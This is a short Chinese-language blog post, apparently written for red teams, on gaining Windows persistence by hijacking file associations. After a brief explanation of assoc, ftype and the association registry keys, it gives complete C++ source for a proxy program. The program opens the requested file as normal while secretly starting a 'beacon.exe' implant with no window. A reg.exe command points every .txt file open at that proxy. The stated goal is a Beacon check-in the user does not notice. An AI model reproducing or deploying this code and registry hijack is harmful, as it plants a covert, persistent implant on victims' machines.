---
title: Persistence Change Default File Association
date: 2023-09-13T16:32:30+08:00
draft: false
url: /posts/2023-09-13/Change-Default-File-Association
tags:
  - Windows
  - Persistence
  - Change-Default-File-Association
---

## 0x00 前言

Persistence Change Default File Association

## 0x01 Change Default File Association

### 原理

Windows中，每个文件扩展名都与一个默认程序关联，关联通过注册表实现

用户试图打开文件时，先在HKEY_USERS查找是否存在扩展名注册表项；如果没有，再到HKEY_CLASSES_ROOT查找

```cmd
# Global
HKEY_CLASSES_ROOT

# Local
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts
```

### assoc

显示或修改文件扩展名关联。 如果不带参数使用，assoc 将显示所有当前文件扩展名关联的列表

```cmd
# 此命令仅在 cmd.exe 中受支持，在 PowerShell 中不可用。 不过，你可以使用 cmd /c assoc 作为解决方法
assoc [<.[ext]>[=[<filetype>]]]
```

查看文件扩展名 .txt 的当前文件类型关联

```cmd
assoc .txt
```

要删除文件扩展名 .bak 的文件类型关联

```cmd
# 请确保在等号后添加空格
assoc .bak=
```

### ftype

显示或修改文件扩展名关联中使用的文件类型

```cmd
ftype [<filetype>[=[<opencommandstring>]]]
```

显示 txtfile 文件类型的当前打开命令字符串

```cmd
ftype txtfile
```

删除名为 example 的文件类型的打开命令字符串

```cmd
ftype example=
```

## 0x02 优雅的方法

使用`ProxyAPP`劫持对应的程序，使Beacon上线过程中达到无感

> 编译环境：Visual Studio 2022
>
> 字符集：Unicode
>
> 权限：需要管理员权限修改注册表

### main.cpp

```c
#include <stdio.h>
#include <Windows.h>
#include <psapi.h>

#include <string>

HANDLE create_new_process(IN const char* path, IN const char* cmd)
{
    STARTUPINFOA si;
    memset(&si, 0, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = 0;

    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(PROCESS_INFORMATION));
    
    if (!CreateProcessA(
        path,
        (LPSTR) cmd,
        NULL, //lpProcessAttributes
        NULL, //lpThreadAttributes
        FALSE, //bInheritHandles
        DETACHED_PROCESS  | CREATE_NO_WINDOW,
        NULL, //lpEnvironment 
        NULL, //lpCurrentDirectory
        &si, //lpStartupInfo
        &pi //lpProcessInformation
    ))
    {
        return NULL;
    }
    return pi.hProcess;
}

void deploy_payload()
{
    char full_path[MAX_PATH] = { 0 };
    char calc_path[] = "C:\\ProgramData\\beacon.exe";
    // ExpandEnvironmentStringsW(LPCWSTR(calc_path), LPWSTR(full_path), MAX_PATH);
    ExpandEnvironmentStringsA(calc_path, full_path, MAX_PATH);
    create_new_process(full_path, NULL);
}

int main(int argc, char *argv[])
{
    std::string merged_args;
    if (argc >= 2) {
        for (int i = 1; i < argc; i++) {
            merged_args += std::string(argv[i]) + " ";
        }
        create_new_process(NULL, merged_args.c_str());
    }

    deploy_payload();
    return 0;
}
```

### 修改注册表

```cmd
HKEY_CLASSES_ROOT\txtfile\shell\open\command

# 修改注册表的值
C:\ProgramData\ProxyApp.exe %SystemRoot%\system32\NOTEPAD.EXE %1

# 命令
reg.exe add "HKEY_CLASSES_ROOT\txtfile\shell\open\command" /ve /d "C:\ProgramData\ProxyApp.exe %SystemRoot%\system32\NOTEPAD.EXE %1" /f
```

